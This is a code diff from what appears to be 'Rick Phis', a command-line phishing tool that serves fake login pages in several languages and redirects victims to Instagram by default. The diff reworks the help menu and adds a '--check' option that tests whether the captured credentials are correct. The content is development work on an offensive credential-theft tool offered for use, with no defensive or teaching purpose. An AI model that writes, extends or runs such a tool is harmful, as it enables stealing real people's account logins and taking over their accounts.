@@ -69,16 +69,19 @@ error_pages = {
     'tr': "errors_htmls\\errortr.html"
 }
 
-help_menu = f"""{Fore.YELLOW}
-Rick Phis - professional phishing tool
+help_menu = f"""{Fore.WHITE}
+RICK PHIS - PROFESSIONAL PHISHING TOOL
 
-Arguments:
-  --site  <site_number>     Site number (e.g., 1, 2, 3)
-  --lang  <language_code>   Language code (ar,az,ch,en,fr,de,it,ko,ru,es,tr) (default: en)
-  --port  <port_number>     Port number (0-65535)
-  --output <file_name>      Gets information as output
-  --location <url>          Redirect location (default: https://instagram.com)
-  --help                    Show this help message and exit
+        Arguments            Reqired           Description 
+                          |          |                                                                                                                  
+  --site  <site_number>   |   {Fore.RED}YES{Fore.WHITE}    |    Site number (e.g., 1, 2, 3)                                                                                   |
+  --lang  <language_code> |   NO     |    Language code (ar,az,ch,en,fr,de,it,ko,ru,es,tr) (default: en)                                                
+  --port  <port_number>   |   NO     |    Port number (0-65535)                                                                                         
+  --output <file_name>    |   NO     |    Gets information as output                                                                                    
+  --location <url>        |   NO     |    Redirect location (default: https://instagram.com)                                                            
+  --check                 |   NO     |    It tests the entered information and shows whether it is correct. 
+                          |          |    Attention, this process may cause delays! 
+  --help                  |   NO     |    Show this help message and exit                                                                               
 """
 
 login_check = False
@@ -155,7 +158,7 @@ def main():
 
     try:
         while True:
-            user_input = input(Fore.BLUE + "Phish: " + Fore.RESET).strip().split()
+            user_input = input(Fore.BLUE + "Phish:" + Fore.RESET).strip().split()
             if 'help' in user_input or '-h' in user_input or '--help' in user_input:
                 print(help_menu)
                 continue
